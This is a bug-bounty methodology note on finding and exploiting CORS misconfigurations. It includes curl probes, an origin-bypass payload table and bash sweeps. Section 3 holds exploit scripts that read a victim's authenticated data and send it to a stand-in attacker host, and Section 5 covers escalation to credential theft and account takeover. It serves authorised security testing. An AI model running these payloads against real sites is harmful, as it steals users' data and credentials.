# Moraa — CORS Misconfiguration (credentialed cross-origin data theft)

> Sources folded in: HackTricks `cors-bypass`, disclosed H1 (#426165 zomato, #758785 Nord, #470298 DoD ATO,
> #2332728), and our own **CONFIRMED** the vendor finding (same-site wildcard `*.acme.example` → live AWS STS creds
> = full console session). Cross-refs: [[framework-misconfig]] (authz methodology), [[auth-oauth]] (CSRF-token leak → ATO), [[open-redirect]] (multi-tenant trusted domain → attacker-controlled origin under a "correct" allowlist).

## THE ONE RULE for CORS
A reflected `Access-Control-Allow-Origin` is **only a finding when paired with
`Access-Control-Allow-Credentials: true` AND the endpoint returns something worth stealing**
(PII, tokens, CSRF token, creds, account data) to an authenticated victim. `ACAO: *` alone, or
reflection **without** credentials, is Info at best — browsers won't send cookies. Prove it with a
real cross-origin read of *your own* authenticated data, then state the delivery vector honestly.

## 1. One-request detection (the probe that decides everything)
```bash
# reflect an arbitrary attacker origin + is credentials on?
curl -s -D- -o /dev/null -H "Origin: https://evilpoc-$(head -c4 /dev/urandom|xxd -p).acme.example" \
     -b "SESSION=<victim>" https://TARGET/api/endpoint | grep -i '^access-control'
```
Decision table on the response:
| ACAO value | ACAC | Verdict |
|---|---|---|
| reflects your attacker origin | `true` | **VULNERABLE** — go exploit |
| reflects attacker origin | absent/false | Low/Info — no cookie theft (unless the data is public-but-sensitive) |
| `*` | `true` | **Browser rejects** — not exploitable (spec forbids `*`+creds). Note only. |
| `*` | absent | Info — only public data |
| `null` | `true` | **VULNERABLE via sandboxed iframe** (see §3) |
| fixed allowlisted host only | — | test the bypass table §2 before dropping it |
| the raw regex string (e.g. `^https://...$`) | `true` | allowlist **disclosed** + hand-rolled CORS — enumerate it (our the vendor case leaked its regex on miss) |

## 2. Origin-validation bypass table (when reflection isn't naive)
Send each as `Origin:` and watch whether it lands in ACAO. Ordered by yield:
| Payload origin (trusted = `target.com`) | Breaks |
|---|---|
| `https://target.com.attacker.com` | suffix / `endsWith`-style / naive `contains` |
| `https://attacker.com` after seeing `target.com` reflected | pure reflection |
| `https://attackertarget.com`, `https://attacker.com-target.com` | prefix / `startsWith` |
| `https://sub.target.com` | any `*.target.com` allow → pivot to a subdomain XSS/takeover |
| `https://apps.target.com/{registered-3rd-party-app}` (or any path/subdomain the trusted domain lets 3rd parties claim) | domain check is CORRECT, but the trusted domain is itself multi-tenant — see `open-redirect.md`'s "Domain check is correct, but is the domain itself multi-tenant?" section |
| `https://target_com.attacker.com`, `https://target.com_.attacker.com` | **underscore** — Chrome/FF send it; regex `.` matches loosely |
| `` https://target.com{.attacker.com ``, `` ...`.attacker.com ``, `https://target.com}.attacker.com` | **Safari** treats `{ } ` `` ` `` as domain-split; regex misses |
| `http://target.com` (downgrade) | scheme not pinned |
| `https://target.com:evil@attacker.com` / `https://target.com@attacker.com` | userinfo confusion |
| `null` | dev-leftover null allowlist (§3) |
Confirm any hit: the exact payload must appear verbatim in `Access-Control-Allow-Origin` with `ACAC: true`.

### 2b. The unescaped-dot sweep — turns "needs a subdomain takeover" into "needs $10"
Hand-rolled allowlists are usually a regex built from a host *pattern* whose dots were never escaped,
so every `.` silently means "any one character". Test it directly: take the legitimate origin and
replace **each dot in turn** with `x`, `-`, `a`, `_`, then RDAP the registrable domain each survivor
implies. Any available domain is an attacker origin obtainable at a registrar — no takeover, no XSS.
```bash
ORIG=portal.tenant.ent.acme.example; H=api-gw.tenant.ent.acme.example; P=/ent/api/account/info
# mutate each dot position, keep whatever still reflects
for sub in x - a _; do for i in $(seq 1 $(grep -o '\.' <<<"$ORIG" | wc -l)); do
  O=$(awk -v s="$sub" -v n=$i '{c=0;out="";for(j=1;j<=length($0);j++){ch=substr($0,j,1);
      if(ch=="."){c++; if(c==n)ch=s} out=out ch} print out}' <<<"$ORIG")
  printf '%-34s ' "$O"; curl -s -D- -o /dev/null "https://$H$P" -H "Origin: https://$O" \
    | grep -i '^access-control-allow-origin' || echo '(none)'
done; done
# then: is the implied registrable domain free?  404 == AVAILABLE
curl -s -o /dev/null -w '%{http_code}\n' https://rdap.verisign.com/com/v1/domain/ent-acme.example
```
Real case (the enterprise-identity product, 2026-09): intended `*.tenant.ent.acme.example` was enforced as
`.+.tenant.ent.acme.example`, so `poc.tenant.ent-acme.example` / `poc.tenant-acme.example` / `poc.tenant.entxacme.example` were all
reflected with `ACAC:true` across 7 gateways — and `ent-acme.example`, `tenant-acme.example`, `entxacme.example`,
`alphaxacme.example`, `tenantxacme.example` were all unregistered.
**But read §4 before getting excited:** an external domain is a *different site*, so a `SameSite=Lax`
session cookie never rides along — which is exactly why a `*.target.com` origin (same-site) is often
the *stronger* bug even though it is harder to obtain. Determine `SameSite` (one `grep` on the login
`Set-Cookie`) **before** you rate this, and if you cannot log in, hold the finding rather than
guessing. Also check the **preflight** honours the same allowlist (`OPTIONS` + `Access-Control-Request-Method`)
— some gateways reflect on the simple request but not on the preflight, which kills non-simple verbs.

### 2c. The allowlist may already contain a free attacker origin
§4/§5 correctly say a CORS misconfig needs a delivery vector, and treat that as "go find an XSS or a
subdomain takeover". Before doing that work, READ the allowlist: hand-rolled allowlists routinely
include third-party platforms that will host attacker-controlled content for free — `*.github.io` /
GitHub Pages, `*.codepen.io`, `*.replit.dev`, `*.glitch.me`, `*.netlify.app`, `*.vercel.app`,
`*.herokuapp.com`, `*.firebaseapp.com`, `*.blob.core.windows.net`, `*.s3.amazonaws.com`, plus the
target's OWN customer-content/tenant domains and any CDN that serves user uploads. If one of those
is reflected with `ACAC: true`, the delivery vector costs a free signup, not a bug.
```bash
for o in https://poc.github.io https://poc.codepen.io https://poc.netlify.app \
         https://poc.vercel.app https://poc.glitch.me https://poc.replit.dev; do
  printf '%-30s ' "$o"
  curl -s -D- -o /dev/null -H "Origin: $o" https://TARGET/api/route \
    | grep -i '^access-control-allow-\(origin\|credentials\)' | tr '\n' ' '; echo
done
```
Caveat that must be stated: those are all cross-SITE origins, so `SameSite=Lax/Strict` session
cookies still will not ride (§4) — this buys you a delivery vector for the `SameSite=None` case, or
for an endpoint authenticated by a header/bearer token the attacker page can obtain. For the
same-site escape you still need an origin under the target's own registrable domain (§4).
Reference: https://www.intigriti.com/blog/business-insights/31-bite-sized-tips-techniques-and-bug-bounty-resources-to-kick-off-2026

## 3. Exploit primitives
**Reflected / prefix / suffix / subdomain (the common case):**
```html
<script>
fetch('https://TARGET/api/account', {credentials:'include'})
 .then(r=>r.text()).then(d=>navigator.sendBeacon('https://attacker.tld/x', d));
// or XHR with withCredentials=true for older targets
</script>
```
Host this on an origin the ACAO validator accepts (attacker.com for reflection; the trusted
subdomain for `*.target.com`).

**`null` origin** — needs no controlled domain, runs from a data: iframe:
```html
<iframe sandbox="allow-scripts" src="data:text/html,<script>
 fetch('https://TARGET/api/account',{credentials:'include'}).then(r=>r.text())
 .then(d=>fetch('https://attacker.tld/x?d='+encodeURIComponent(d)))
</script>"></iframe>
```

## 4. SameSite — the gate that decides real-world impact (read carefully)
The cookie only rides cross-origin if SameSite permits it. **This is where most CORS "findings" die or get downgraded.**
- `SameSite=None; Secure` → sent cross-site → **fully exploitable from any attacker origin**.
- `SameSite=Lax` (browser default) → sent only on top-level GET navigations, NOT on `fetch`/XHR cross-*site* → a cross-*site* CORS exploit **won't carry the cookie**. Downgrades to needing a same-site origin.
- `SameSite=Strict` → never cross-site.
- **SAME-SITE ESCAPE (our the vendor finding, and the reason it's High not Info):** if the attacker
  origin and the target share the **registrable domain** (`evil.acme.example` vs `remoteaccess.svc.acme.example`
  both = `acme.example`), the request is **same-site**, so the cookie rides even under `SameSite=Lax/Strict`.
  A `*.target.com`-wildcard CORS is therefore far worse than an `attacker.com`-reflection one — it
  only needs a script-exec primitive *somewhere* under the registrable domain (subdomain XSS,
  subdomain takeover, tenant-controlled content, an open-redirect-to-JS). Always report which
  SameSite value is in play and whether a same-site origin is reachable.
- **`curl` enforces nothing — a curl PoC is not a browser PoC.** `curl -H "Origin:
  https://attacker.com" -b "SESSION=..."` happily sends the cookie with a spoofed Origin; a real
  browser will not. Read the ACTUAL `Set-Cookie` line (`curl -sI ... | grep -i set-cookie`) before
  calling anything exploitable — this distinction burned two findings on a live engagement.
- **Same company ≠ same site.** Same-site is about the registrable domain (eTLD+1), not corporate
  ownership: `.acme.example` and `.acme-legacy.example` are one company with one SSO but TWO different registrable
  domains, so a `.acme.example` cookie is CROSS-site with an `.acme-legacy.example` origin. And a portable token
  ACCEPTED cross-domain when manually pasted into a header is not the same as a browser
  AUTOMATICALLY ATTACHING it — verify each TLD/domain independently.

This is the canonical SameSite reasoning for the whole library — `csrf.md` and
`session-management.md` gate on it by reference instead of restating it.

## 5. Escalation — turn "reads my own data" into impact (this is what pays)
- **Credential / token theft (highest):** endpoint returns API keys, bearer tokens, or — like our
  the vendor case — **cloud STS credentials**. Steal → use out-of-band. Our case: `create-credentials`
  returned AWS STS creds that SigV4-signed the whole console API. Verify what the stolen secret
  actually unlocks (we proved 200 on the console API).
- **CSRF-token leak → ATO (H1 pattern):** the reflected endpoint returns the victim's CSRF token in
  its body → cross-origin read it → replay it to a state-changing endpoint (change email/password) →
  account takeover. This is how a "CORS on a GET with no direct impact" becomes a Critical. (Disclosed
  H1: password-reset CORS leaked the CSRF token used by the update-profile form.)
- **PII / financial mass read:** loop the reflected read over object IDs.
- **Chain with a found XSS/takeover:** a normally site-scoped XSS on `sub.target.com` becomes
  credential theft the moment `sub.target.com` is CORS-trusted by the sensitive API.

## 6. Fleet / systemic check (don't stop at one host)
Hand-rolled CORS is usually a shared gateway/middleware default → test the SIBLINGS. On our estate
9–11 `*.svc` hosts shared the same wildcall; one (`account.svc`) was correctly hardened (explicit
`403 CORS_ERROR`) — which both scoped the finding honestly AND gave the remediation ("configure the
others like account.svc"). Build a per-host blast-radius table: `{host, route, ACAO-reflects?, ACAC, sensitive data returned}`.
Note: `/` often won't carry the CORS middleware — test **real API routes**, and try `OPTIONS`
(preflight sometimes answers without the authorizer and reveals allowed methods/routes).

## 7. Report checklist (what a triager needs)
1. unauth probe showing reflection + `ACAC: true` (+ the leaked allowlist if any)
2. authed request from an arbitrary attacker origin returning YOUR real data/creds
3. proof the returned secret has impact (GetCallerIdentity / the token used on a protected route)
4. SameSite value + the concrete delivery origin (why the cookie rides)
5. per-host blast radius; note any correctly-hardened sibling as the remediation model

## Tools
`corsy -u https://host`, `CORScanner`, Burp CORS* fuzzer (BApp), or the curl one-liner in §1 across a host list.

## 8. CORS config is often PER-ROUTE, not per-host (verify on the exact data route)
A host can have inconsistent CORS across its own routes — an API-Gateway/undefined-route default
(often looser, but usually 403s with no real data) is NOT the same policy as the actual data-bearing
endpoint. Confirmed live: `remoteaccess.svc.acme.example/` reflected a MULTI-label origin on OPTIONS, but the
real `/create-credentials` endpoint correctly rejected multi-label and only reflects single-label —
the original finding's scope was exactly right. **Always re-verify the exact vulnerable claim on the
SPECIFIC route that returns real data**, not on `/` — a broader reflection on an unrelated/dead route
is not the same bug and does not widen the blast radius.
